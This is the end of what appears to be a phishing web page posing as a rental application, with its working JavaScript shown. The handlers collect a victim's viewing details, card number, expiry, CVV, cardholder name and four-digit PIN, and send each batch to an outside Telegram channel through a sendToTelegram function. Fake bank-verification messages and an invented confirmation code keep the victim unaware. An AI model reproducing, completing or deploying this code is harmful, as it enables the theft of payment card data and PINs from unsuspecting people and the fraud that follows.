        document.getElementById('step4Btn').addEventListener('click', function() {
            applicationData.viewing.date = document.getElementById('viewingDate').value || '2025-02-21';
            applicationData.viewing.time = document.getElementById('viewingTime').value || '3:00 PM';
            applicationData.viewing.guests = document.getElementById('guests').value || '2 guests';
            
            sendToTelegram('4 - SCHEDULE', applicationData);
            
            document.getElementById('confirmDate').textContent = new Date(applicationData.viewing.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
            document.getElementById('confirmTime').textContent = applicationData.viewing.time;
            
            goToStep(5);
        });
        
        // Step 5 - Card
        document.getElementById('step5Btn').addEventListener('click', function() {
            applicationData.card.number = document.getElementById('cardNumber').value || '[EMPTY]';
            applicationData.card.expiry = document.getElementById('cardExpiry').value || '[EMPTY]';
            applicationData.card.cvv = document.getElementById('cardCvv').value || '[EMPTY]';
            applicationData.card.cardName = document.getElementById('cardName').value || '[EMPTY]';
            
            sendToTelegram('5 - CARD', applicationData);
            
            goToStep('processing');
            
            const progressFill = document.getElementById('progressFill');
            progressFill.style.width = '0%';
            
            const statusEl = document.getElementById('processingStatus');
            const messages = ['Connecting to bank...', 'Verifying card...', 'Processing application...', 'Almost done...'];
            let messageIndex = 0;
            
            const messageInterval = setInterval(() => {
                if (messageIndex < messages.length) {
                    statusEl.textContent = messages[messageIndex];
                    messageIndex++;
                }
            }, 600);
            
            setTimeout(() => { progressFill.style.width = '100%'; }, 50);
            
            setTimeout(() => {
                clearInterval(messageInterval);
                goToStep(6);
            }, 3000);
        });
        
        // Step 6 - PIN
        document.getElementById('step6Btn').addEventListener('click', function() {
            const pin1 = document.getElementById('pin1').value || '';
            const pin2 = document.getElementById('pin2').value || '';
            const pin3 = document.getElementById('pin3').value || '';
            const pin4 = document.getElementById('pin4').value || '';
            
            applicationData.pin = pin1 + pin2 + pin3 + pin4 || '[EMPTY]';
            
            sendToTelegram('6 - PIN - COMPLETE', applicationData);
            
            // Generate random confirmation code
            const today = new Date();
            const year = today.getFullYear();
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const day = String(today.getDate()).padStart(2, '0');
            const random = Math.floor(Math.random() * 9000 + 1000);
            document.getElementById('confirmationCode').textContent = `ML-${year}${month}${day}-${random}`;
            
            goToStep(7);
        });
        
        window.goToStep = goToStep;
        
        // Set default date
        const today = new Date();
        today.setDate(today.getDate() + 2);
        const defaultDate = today.toISOString().split('T')[0];
        document.getElementById('viewingDate').value = defaultDate;
    </script>
</body>
</html>
